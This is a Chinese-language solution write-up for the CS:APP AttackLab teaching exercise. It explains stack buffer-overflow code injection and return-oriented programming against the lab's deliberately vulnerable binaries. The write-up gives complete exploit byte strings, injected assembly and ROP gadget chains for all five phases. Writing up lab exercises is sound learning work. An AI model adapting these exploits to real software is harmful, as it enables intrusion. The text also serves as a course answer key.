# AttackLab

**简介:** 通过两类手段攻击(CI,ROP)有漏洞的目标程序完成指定的任务.

**方法:** 利用hex2raw工具将编写的16进制编码转化为可输入到目标程序的字符,并且通过缓冲区溢出来执行所编码的指令.

**注意事项:**

- 运行ctarget/rtarget时必须添加参数-q,否则会因无法提交结果到服务器而报错
- 采取小端法



---



## Part I: Code Injection Attacks

#### I.phase 1

这一阶段不需要注入新的代码,只需要让getbuf返回到touch1.

ctarget将会调用test:

```C
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

在ctarget内还有另外一个函数:

```C
void touch1(){
	vphase = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

getbuf的结构非常简单:

```C
unsigned getbuf(){
	char buf[BUFFER_SIZE];
	Gets(buf);		// 类似于gets
	return 1;
}
```

这个Gets是没有检查越界问题的,所以输入到buf的字符串如果过长就会写入到栈帧的其他部分,利用这个特性来攻击.

BUFFER_SIZE通过汇编码可以看出来:

```
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp	# 看这里
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```

这个函数分配了一个0x28(即40)字节的栈帧,显然这个栈帧的内容全部是用来存储buf的.

栈帧的结构如下(向下地址减小):

|            ...             |
| :------------------------: |
|      返回地址(8字节)       |
| getbuf的栈帧(即buf,40字节) |

写入到buf时,输入的内容按地址增大方向进入getbuf的栈帧,当内容超过40字节后,继续写入将会覆盖掉返回地址.

所以先随便写入40字节内容,之后再写入touch1的起始地址(8字节)覆盖原先的返回地址就可以了.

```
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp	# touch1的起始地址是0x4017c0
   ...
```

因此有下面的攻击代码:

```
/* exploit.txt */
30 30 30 30 30 30 30 30 /* 30是数字0的ASCII,这个不重要 */
30 30 30 30 30 30 30 30 
30 30 30 30 30 30 30 30 
30 30 30 30 30 30 30 30 
30 30 30 30 30 30 30 30 /* 40个字节 */
c0 17 40 00 00 00 00 00	/* touch1的地址 */
0a	/* 换行符,用来结束输入 */
```

使用下面的指令:

```
./hex2raw < exploit.txt > exploit-raw.txt
cat exploit.txt | ./hex2raw | ./ctarget -q
```

就通过了这一阶段.

#### I.phase 2

这一阶段需要注入一些代码,以将cookie作为参数来执行touch2(unsigned val).

```C
// 地址:0x4017ec
void touch2(unsigned val){
	vphase = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

与phase1的区别在于要多办一件事情:跳转到touch2之前要把cookie放到寄存器%rdi中.

这件事情就需要新的指令来完成,这些指令将会被写入到buf中,并且用这些指令的起始地址覆盖栈帧中原本的返回地址.

这些指令要做的事情如下:

- 将cookie放到%rdi中
- 再次改写返回地址,使其指向touch2
- 返回

于是有:

```
sub $0x8,%rsp           # rewrite return address
movq $0x4017ec,(%rsp)   # to touch2, 没有后缀q会报错
mov $0x59b997fa,%edi    # cookie
ret                     # return to touch2
```

与攻击代码:

```
/* exploit.txt */
48 83 ec 08 48 c7 04 24 
ec 17 40 00 bf fa 97 b9 
59 c3 30 30 30 30 30 30 /* 这一段是上面的指令的编码 */
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00 /* buf的起始位置 */
0a
```

至于为什么要先把栈指针减小8,再次参考这个栈帧:

|                 ...                  |
| :----------------------------------: |
|   返回地址(8字节,地址:0x5561dca0)    |
| getbuf(即buf,40字节,地址:0x5561dc78) |

当用buf的起始位置覆盖了原本的返回地址后,getbuf调用ret指令便会将%rip(程序计数器)设为这里,之后就会执行注入到此处的攻击代码.

注意到,getbuf的ret指令同时还把%rsp的值增加了8,现在它指向...部分,修改这一部分将会破坏这段不了解的栈帧,导致不可控的结果.

所以不能把touch2的地址写到这里,而是要重复利用getbuf后的8字节的空间.

#### I.phase 3

与phase2类似,但是这次要把cookie作为字符串传递,而不是数值.具体地说就是touch3(char *sval)的参数.

在利用溢出buf修改返回地址到注入的代码(注入到buf里)后,注入的代码要做的事情:

- 将指向字符串cookie的指针放到%rdi中

- 再次改写返回地址,指向touch3

- 返回

也就是:

```
sub $0x38,%rsp		# to 0x5561dc70
movq $0x4018fa,(%rsp)	# return to touch3
mov $0x5561dc90,%rdi   # save string address
ret
```

为什么要把rsp减去这么多呢,假设不分配额外的空间之间转到touch3,接下来的一系列操作(比如被调用者/调用者把原寄存器值保存到栈上)将会把保存在栈上原buf位置的cookie覆盖掉,那么传递cookie的指针就没有意义了.

最后得攻击代码:

```
48 83 ec 38 48 c7 04 24 /* 注入代码的编码,最后的30是凑数的 */
fa 18 40 00 48 c7 c7 90
dc 61 55 c3 30 30 30 30
35 39 62 39 39 37 66 61 /* cookie的值 */
00 00 00 00 00 00 00 00 /* 字符串末尾的结束标识 */
78 dc 61 55 00 00 00 00 
0a
```



## Part II: Return-Oriented Programming

这一次目标程序改为了rtarget,使用了栈随机化和限制可执行区域(不能执行栈上的代码),使得在ctarget上的策略不可行,而是使用ROP.

原理是通过buf溢出,用覆盖到栈上的一系列返回地址和数据来控制程序不断跳转到rtarget内原有的一些函数,并利用它们执行的某些操作来达到目的,就像是不停地"断章取义".

#### II.phase 4

这一阶段要求完成phase2同样的任务,即把cookie数值作为唯一的参数传递给touch2.

区别是,这一次没有办法注入代码,而是利用farm.c中提示的函数.

运行两条指令:

```
gcc -c -Og farm.c
objdump -d farm.o > farm.s
```

得到farm.s,观察到下面这两个函数(第一列不是真实的地址):

```
0000000000000014 <addval_273>:
  14:	f3 0f 1e fa          	endbr64 
  18:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  1e:	c3                   	retq   
...
000000000000001f <addval_219>:
  1f:	f3 0f 1e fa          	endbr64 
  23:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  29:	c3                   	retq   
```

断章取义出两个片段:

```
# addval_273 第二行末尾
89 c7 
c3
# addval_219 第二行末尾和第三行
58 
90
c3
```

结合AttackLab的pdf中提供的表格,这些编码对应指令:

```
# addval_273 
movl %eax,%edi
ret
# addval_219
popq %rax
nop
ret
```

现在假设栈顶是cookie的值,之后如果先执行add_val219的片段,再执行addval_273的片段,效果就是8字节的cookie值被传递到了%edi中,此时再让addval_273的片段返回到touch2就可以了.

直接给出攻击代码,其中函数的真实地址(偏移的)通过在gdb中使用disas指令得到:

```
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 
30 30 30 30 30 30 30 30 
30 30 30 30 30 30 30 30 
ab 19 40 00 00 00 00 00 /* addval_219 address */
fa 97 b9 59 00 00 00 00 /* cookie */
a3 19 40 00 00 00 00 00 /* addval_273 address */
ec 17 40 00 00 00 00 00 /* touch2 address */
0a
```

#### II.phase 5

attacklab.pdf开篇警告这个阶段很难,这比把BombLab的secret_phase藏起来要好.

这一阶段要求做和ctarget中的第三阶段相同的事情,被告知官方解法使用了8次gadget.

我先把farm.s整理了一下,去重并将可得到的新指令标注出来后得到了本目录下的Selectedfarm.s用来参考.

现在就有了9个gadget,除了add_xy之外的每个都只执行一条汇编指令.

经过思考后我画出了这样一个栈帧,gadget的地址直接用其执行的汇编指令(省略了ret)替代:

|         cookie          |
| :---------------------: |
| 00 00 00 00 00 00 00 00 |
|     touch3起始地址      |
|      mov %rax,%rdi      |
|    add_xy(%rdi,%rsi)    |
|     movl %ecx,%esi      |
|     movl %edx,%ecx      |
|     movl %eax,%edx      |
|          0x48           |
|        popq %rax        |
|     movq %rax,%rdi      |
|     movq %rsp,%rax      |
|       buf(40字节)       |

从buf到add_xy这一段实际上都是在计算cookie所在的地址.方法是计算%rsp在一个特定时刻的值与偏置量0x48的和来得到预先设计好的cookie的位置.

cookie的位置经add_xy计算后存储在%rax中返回,将其移入%rdi后调用touch3即可.

我尝试过将cookie及其尾随的8字节0置入buf中,有一个细节使得这种做法无法完成:

想要把偏置量置入%rsi寄存器中,只能在非常有限的gadget中通过下列指令完成:

```
movl %eax,%edx
movl %edx,%ecx
movl %ecx,%esi
```

这些指令全都以l为后缀,他们都有把高4字节清零的副作用,这意味着无法传递一个负数到%esi中,所以cookie若置入buf中是没法算出位置的.

最后得攻击代码:

```
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
06 1a 40 00 00 00 00 00 /* addval_190 */
c5 19 40 00 00 00 00 00 /* setval_426 */
ab 19 40 00 00 00 00 00 /* addval_219 */
48 00 00 00 00 00 00 00 /* rsp + 0x48 -> cookie address */
42 1a 40 00 00 00 00 00 /* addval_487 */
69 1a 40 00 00 00 00 00 /* getval_311 */
13 1a 40 00 00 00 00 00 /* addval_436 */
d6 19 40 00 00 00 00 00 /* add_xy */
c5 19 40 00 00 00 00 00 /* setval_426 */
fa 18 40 00 00 00 00 00 /* touch3 */
35 39 62 39 39 37 66 61 /* cookie */
00 00 00 00 00 00 00 00
/* 发现没有0a也可以 */
```

